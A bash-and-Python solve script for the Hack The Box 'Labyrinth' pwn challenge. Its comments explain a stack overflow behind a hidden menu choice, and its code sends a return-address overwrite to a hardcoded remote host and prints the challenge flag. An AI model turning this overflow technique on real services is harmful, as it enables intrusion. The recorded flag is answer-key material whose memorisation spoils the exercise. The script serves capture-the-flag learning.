#!/usr/bin/env bash

set -euo pipefail

# Challenge: Labyrinth
# Platform: Hack The Box - CTF Try Out
# Category: Pwn / Binary Exploitation
#
# Scenario summary:
# The binary presents 100 doors and makes the challenge sound like a "guess the
# correct door" game. The catch is that door 69 unlocks a hidden second stage,
# and that stage contains a classic stack overflow.
#
# Provided files:
#   - pwn_labyrinth.zip
#   - challenge/labyrinth
#   - challenge/glibc/ld-linux-x86-64.so.2
#   - challenge/glibc/libc.so.6
#   - challenge/flag.txt
#
# Remote target used during solve:
#   - 154.57.164.72:30444
#
# Reversing notes:
# After the banner, the program reads the chosen door with read_num().
# If the first input is "69" or "069", it prints a hidden prompt and then does:
#
#   fgets(buffer, 0x44, stdin);
#
# but the destination buffer is only 0x30 bytes long.
#
# Stack layout in main():
#   rbp-0x30 ... rbp-0x01   buffer[48]
#   rbp+0x00                saved rbp
#   rbp+0x08                saved return address
#
# So the exact overwrite distance is:
#   48 bytes -> reach saved rbp
#   56 bytes -> reach saved RIP
#
# At first glance, the obvious move is to jump to escape_plan(), the hidden win
# function. But returning to the *start* of that function is messy because it
# builds a fresh stack frame and the overwritten context is not ideal.
#
# The stable trick is better:
#   1. Overwrite saved rbp with a writable .bss address: 0x404150
#   2. Overwrite RIP with 0x401287
#
# Why 0x401287?
# It lands *inside* escape_plan() after the opening art has already been
# handled, right before the code prints the congratulations line, opens
# "./flag.txt", and reads the flag byte-by-byte.
#
# Why overwrite saved rbp too?
# Because this mid-function entry uses stack locals like [rbp-4] and [rbp-5].
# If rbp is still junk from the overflow, those writes crash or corrupt
# unmapped memory. Pointing rbp at writable .bss gives the function safe local
# storage and lets the file-read loop complete cleanly.
#
# Final payload layout:
#   "69\\n"                              -> unlock hidden branch
#   "A" * 48                            -> fill vulnerable buffer
#   p64(0x404150)                       -> saved rbp to writable memory
#   p64(0x401287)                       -> jump into file-reading part of win
#
# Real-world lesson:
# Not every stack overflow needs full shellcode or a long ROP chain. Many
# practical exploits are simply "redirect execution into an already useful code
# path" while fixing just enough surrounding state for that path to succeed.
#
# Final live flag obtained during testing:
#   HTB{3sc4p3_fr0m_4b0v3}

HOST="${1:-154.57.164.72}"
PORT="${2:-30444}"

python3 - "$HOST" "$PORT" <<'PY'
import re
import socket
import struct
import sys
import time

host = sys.argv[1]
port = int(sys.argv[2])

# Writable .bss address used as a fake saved rbp.
fake_rbp = 0x404150

# Mid-function entry inside escape_plan() that prints the success text and then
# opens ./flag.txt and streams it to stdout.
win_mid = 0x401287

payload = b"A" * 48
payload += struct.pack("<Q", fake_rbp)
payload += struct.pack("<Q", win_mid)
payload += b"\n"

with socket.create_connection((host, port), timeout=8) as s:
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    # Stage 1: choose the magic door that unlocks the hidden overflow path.
    time.sleep(0.3)
    s.sendall(b"69\n")

    # Stage 2: deliver the overflow payload at the second prompt.
    time.sleep(0.3)
    s.sendall(payload)

    time.sleep(1.5)
    s.settimeout(2)
    chunks = []
    while True:
        try:
            data = s.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)

output = b"".join(chunks).decode("latin-1", errors="ignore")
match = re.search(r"HTB\{[^}]+\}", output)

if not match:
    print(output)
    raise SystemExit("[-] Flag not found in response.")

print(match.group(0))
PY
